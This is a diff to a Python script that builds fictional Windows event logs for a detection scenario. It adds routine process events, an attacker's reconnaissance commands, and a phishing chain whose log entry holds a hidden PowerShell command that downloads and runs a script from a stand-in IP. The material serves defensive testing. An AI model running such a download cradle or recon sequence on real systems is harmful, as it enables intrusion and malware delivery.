@@ -3,7 +3,10 @@
 All hosts, users and IPs are fictional (IPs from RFC 5737 documentation ranges).
 Scenario on WS-FINANCE01, 2026-03-02 (UTC):
   - normal workday logons
+  - normal process activity (4688)
   - 09:15 brute force on 'administrator' from 203.0.113.50, ending in a success
+  - 09:17 reconnaissance commands run as 'administrator'
+  - 10:30 jdoe opens a document: WINWORD spawns PowerShell, which runs C:\\Users\\Public\\update.exe
   - 11:00 password spray from 198.51.100.7 across 8 accounts
   - 13:30 new user 'svc_backup2' created and added to Administrators
   - 13:42 service installed running encoded PowerShell
@@ -38,6 +41,12 @@ def msg_4625(user: str, ip: str, ltype: str) -> str:
             f"\nNetwork Information:\n\tSource Network Address:\t{ip}\n")
 
 
+def msg_4688(user: str, image: str, parent: str, cmd: str) -> str:
+    return ("A new process has been created.\n\nCreator Subject:\n\tAccount Name:\t\t" + user +
+            "\n\nTarget Subject:\n\tAccount Name:\t\t-\n\nProcess Information:\n"
+            f"\tNew Process Name:\t{image}\n\tCreator Process Name:\t{parent}\n\tProcess Command Line:\t{cmd}\n")
+
+
 def build_events() -> list[dict]:
     ev: list[dict] = []
 
@@ -58,6 +67,33 @@ def build_events() -> list[dict]:
     add(t + timedelta(seconds=8 * 14 + 3), 4624, msg_4624("administrator", "203.0.113.50", "3"))
     add(t + timedelta(seconds=8 * 14 + 4), 4672,
         "Special privileges assigned to new logon.\n\nSubject:\n\tAccount Name:\t\tadministrator\n")
+
+    sys32, cmd = "C:\\Windows\\System32\\", "C:\\Windows\\System32\\cmd.exe"
+    for i in range(25):  # routine process activity, incl. one lone ipconfig (must not count as recon)
+        t = DAY + timedelta(hours=8, minutes=rng.randint(0, 600))
+        user = rng.choice(staff)
+        image, parent = rng.choice([
+            ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "C:\\Windows\\explorer.exe"),
+            ("C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "C:\\Windows\\explorer.exe"),
+            (sys32 + "notepad.exe", "C:\\Windows\\explorer.exe"),
+        ])
+        add(t, 4688, msg_4688(user, image, parent, f'"{image}"'))
+    add(DAY + timedelta(hours=14, minutes=5), 4688, msg_4688("mlee", sys32 + "ipconfig.exe", cmd, "ipconfig /all"))
+
+    t = DAY + timedelta(hours=9, minutes=17)  # recon by the attacker after the brute-force success
+    for i, (exe, args) in enumerate([("whoami.exe", "whoami /all"), ("net.exe", "net user"),
+                                     ("net.exe", "net localgroup administrators"), ("ipconfig.exe", "ipconfig /all"),
+                                     ("systeminfo.exe", "systeminfo"), ("nltest.exe", "nltest /domain_trusts")]):
+        add(t + timedelta(seconds=25 * i), 4688, msg_4688("administrator", sys32 + exe, cmd, args))
+
+    t = DAY + timedelta(hours=10, minutes=30)  # phishing document -> PowerShell -> dropped binary
+    add(t, 4688, msg_4688(
+        "jdoe", sys32 + "WindowsPowerShell\\v1.0\\powershell.exe",
+        "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.20/a.ps1')\""))
+    add(t + timedelta(seconds=40), 4688, msg_4688(
+        "jdoe", "C:\\Users\\Public\\update.exe", sys32 + "WindowsPowerShell\\v1.0\\powershell.exe",
+        "C:\\Users\\Public\\update.exe"))
 
     t = DAY + timedelta(hours=11)  # password spray
     for i, user in enumerate(["jdoe", "asmith", "mlee", "kpatel", "rgarcia", "tnguyen", "bwilson", "hr_admin"]):
